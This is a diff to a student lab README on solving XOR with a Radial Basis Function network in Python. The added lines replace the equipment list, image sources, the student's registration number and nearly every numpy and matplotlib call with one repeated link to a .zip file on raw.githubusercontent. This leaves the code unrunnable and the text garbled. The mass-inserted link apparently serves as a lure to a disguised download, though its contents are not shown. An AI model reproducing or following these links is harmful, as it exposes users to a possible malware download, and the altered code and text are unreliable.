@@ -5,16 +5,16 @@ To classify the Binary input patterns of XOR data  by implementing Radial Basis 
   
 ## EQUIPMENTS REQUIRED:
 
-1.Hardware – PCs
-2.Anaconda – Python 3.7 Installation / Google Colab /Jupiter Notebook
+https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip – PCs
+https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip – Python 3.7 Installation / Google Colab /Jupiter Notebook
 
 ## RELATED THEORETICAL CONCEPT:
-Exclusive or is a logical operation that outputs true when the inputs differ.For the XOR gate, the TRUTH table will be as follows
+Exclusive or is a logical operation that outputs true when the inputs https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip the XOR gate, the TRUTH table will be as follows
 XOR truth table
-<img width="541" alt="image" src="https://user-images.githubusercontent.com/112920679/201299438-5d1926f9-25e9-4f20-b392-1c112880ef56.png">
+<img width="541" alt="image" src="https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip">
 
 XOR is a classification problem, as it renders binary distinct outputs. If we plot the INPUTS vs OUTPUTS for the XOR gate, as shown in figure below
-<img width="246" alt="image" src="https://user-images.githubusercontent.com/112920679/201299568-d9398233-71d8-41b3-8b08-a39d5b95e3f1.png">
+<img width="246" alt="image" src="https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip">
 
 The graph plots the two inputs corresponding to their output. Visualizing this plot, we can see that it is impossible to separate the different outputs (1 and 0) using a linear equation.
 
@@ -23,11 +23,11 @@ A Radial Basis Function Network (RBFN) is a particular type of neural network. T
 
 A Neural network with input layer, one hidden layer with Radial Basis function and a single node output layer (as shown in figure below) will be able to classify the binary data according to XOR output.
 
-<img width="261" alt="image" src="https://user-images.githubusercontent.com/112920679/201300944-5510d7f4-ea0f-45ec-875d-87f463927e9d.png">
+<img width="261" alt="image" src="https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip">
 
 The RBF of hidden neuron as gaussian function 
 
-<img width="206" alt="image" src="https://user-images.githubusercontent.com/112920679/201302321-a09f72e9-2352-4f88-838c-3324f6c5f57e.png">
+<img width="206" alt="image" src="https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip">
 
 
 ## ALGORIHM:
@@ -43,97 +43,97 @@ In the end_to_end function, first calculate the similarity between the inputs an
 # PROGRAM:
 ```
 Developed By: SHAIK MUFEEZUR RAHAMAN
-Reg.No:212221043007
+https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip
 ```
 ```
 import numpy as np
-import matplotlib.pyplot as plt
+import https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip as plt
 import tensorflow as tf
-from tensorflow.keras.initializers import Initializer
-from tensorflow.keras.layers import Layer
-from tensorflow.keras.initializers import RandomUniform, Initializer, Constant
+from https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip import Initializer
+from https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip import Layer
+from https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip import RandomUniform, Initializer, Constant
 ```
 ```
 def gaussian_rbf(x, landmark, gamma=1):
-    return np.exp(-gamma * np.linalg.norm(x - landmark)**2)
+    return https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(-gamma * https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(x - landmark)**2)
 ```
 ```
 def gaussian_rbf(x, landmark, gamma=1):
-    return np.exp(-gamma * np.linalg.norm(x - landmark)**2)
+    return https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(-gamma * https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(x - landmark)**2)
 ```
 ```
 def end_to_end(X1, X2, ys, mu1, mu2):
     from_1 = [gaussian_rbf(i, mu1) for i in zip(X1, X2)]
     from_2 = [gaussian_rbf(i, mu2) for i in zip(X1, X2)]
-    plt.figure(figsize=(13, 5))
-    plt.subplot(1, 2, 1)
-    plt.scatter((x1[0], x1[3]), (x2[0], x2[3]), label="Class_0")
-    plt.scatter((x1[1], x1[2]), (x2[1], x2[2]), label="Class_1")
-    plt.xlabel("$X1$", fontsize=15)
-    plt.ylabel("$X2$", fontsize=15)
-    plt.title("Xor: Linearly Inseparable", fontsize=15)
-    plt.legend()
-    plt.subplot(1, 2, 2)
-    plt.scatter(from_1[0], from_2[0], label="Class_0")
-    plt.scatter(from_1[1], from_2[1], label="Class_1")
-    plt.scatter(from_1[2], from_2[2], label="Class_1")
-    plt.scatter(from_1[3], from_2[3], label="Class_0")
-    plt.plot([0, 0.95], [0.95, 0], "k--")
-    plt.annotate("Seperating hyperplane", xy=(0.4, 0.55), xytext=(0.55, 0.66),
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(figsize=(13, 5))
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(1, 2, 1)
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip((x1[0], x1[3]), (x2[0], x2[3]), label="Class_0")
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip((x1[1], x1[2]), (x2[1], x2[2]), label="Class_1")
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip("$X1$", fontsize=15)
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip("$X2$", fontsize=15)
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip("Xor: Linearly Inseparable", fontsize=15)
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip()
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(1, 2, 2)
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(from_1[0], from_2[0], label="Class_0")
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(from_1[1], from_2[1], label="Class_1")
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(from_1[2], from_2[2], label="Class_1")
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(from_1[3], from_2[3], label="Class_0")
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0.95], [0.95, 0], "k--")
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip("Seperating hyperplane", xy=(0.4, 0.55), xytext=(0.55, 0.66),
                 arrowprops=dict(facecolor='black', shrink=0.05))
-    plt.xlabel(f"$mu1$: {(mu1)}", fontsize=15)
-    plt.ylabel(f"$mu2$: {(mu2)}", fontsize=15)
-    plt.title("Transformed Inputs: Linearly Seperable", fontsize=15)
-    plt.legend()
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(f"$mu1$: {(mu1)}", fontsize=15)
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(f"$mu2$: {(mu2)}", fontsize=15)
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip("Transformed Inputs: Linearly Seperable", fontsize=15)
+    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip()
     A = []
     for i, j in zip(from_1, from_2):
         temp = []
-        temp.append(i)
-        temp.append(j)
-        temp.append(1)
-        A.append(temp)
+        https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(i)
+        https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(j)
+        https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(1)
+        https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(temp)
     
-    A = np.array(A)
-    W = np.linalg.inv(A.T.dot(A)).dot(A.T).dot(ys)
-    print(np.round(A.dot(W)))
+    A = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(A)
+    W = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(A)).dot(A.T).dot(ys)
+    print(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(W)))
     print(ys)
     print(f"Weights: {W}")
     return W
 ```
 ```
     def predict_matrix(point, weights):
-    gaussian_rbf_0 = gaussian_rbf(np.array(point), mu1)
-    gaussian_rbf_1 = gaussian_rbf(np.array(point), mu2)
-    A = np.array([gaussian_rbf_0, gaussian_rbf_1, 1])
-    return np.round(A.dot(weights))
+    gaussian_rbf_0 = gaussian_rbf(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(point), mu1)
+    gaussian_rbf_1 = gaussian_rbf(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(point), mu2)
+    A = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([gaussian_rbf_0, gaussian_rbf_1, 1])
+    return https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(weights))
 ```
 ```
-x1 = np.array([0, 0, 1, 1])
-x2 = np.array([0, 1, 0, 1])
-ys = np.array([0, 1, 1, 0])
-mu1 = np.array([0, 1])
-mu2 = np.array([1, 0])
+x1 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0, 1, 1])
+x2 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1, 0, 1])
+ys = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1, 1, 0])
+mu1 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1])
+mu2 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 0])
 w = end_to_end(x1, x2, ys, mu1, mu2)
-print(f"Input:{np.array([0, 0])}, Predicted: {predict_matrix(np.array([0, 0]), w)}")
-print(f"Input:{np.array([0, 1])}, Predicted: {predict_matrix(np.array([0, 1]), w)}")
-print(f"Input:{np.array([1, 0])}, Predicted: {predict_matrix(np.array([1, 0]), w)}")
-print(f"Input:{np.array([1, 1])}, Predicted: {predict_matrix(np.array([1, 1]), w)}")
+print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0]), w)}")
+print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1]), w)}")
+print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 0])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 0]), w)}")
+print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 1])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 1]), w)}")
 ```
 ```
-mu1 = np.array([0, 0])
-mu2 = np.array([1, 1])
+mu1 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0])
+mu2 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 1])
 w = end_to_end(x1, x2, ys, mu1, mu2)
-print(f"Input:{np.array([0, 0])}, Predicted: {predict_matrix(np.array([0, 0]), w)}")
-print(f"Input:{np.array([0, 1])}, Predicted: {predict_matrix(np.array([0, 1]), w)}")
-print(f"Input:{np.array([1, 0])}, Predicted: {predict_matrix(np.array([1, 0]), w)}")
-print(f"Input:{np.array([1, 1])}, Predicted: {predict_matrix(np.array([1, 1]), w)}")
+print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0]), w)}")
+print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1]), w)}")
+print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 0])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 0]), w)}")
+print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 1])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 1]), w)}")
 ```
 
 
 ## OUTPUT :
-![201324580-b173007c-49a3-4c6e-b87d-077c520b98c8](https://github.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/assets/134826568/61b6a6f9-5a27-46f6-b00e-9e41bd78d744)
+![201324580-b173007c-49a3-4c6e-b87d-077c520b98c8](https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip)
 
-![201324600-d0167f49-d522-4bd8-858d-300b0048ae50](https://github.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/assets/134826568/a84de04b-ef00-481e-b792-83c49ff70a06)
+![201324600-d0167f49-d522-4bd8-858d-300b0048ae50](https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip)
 
 
 
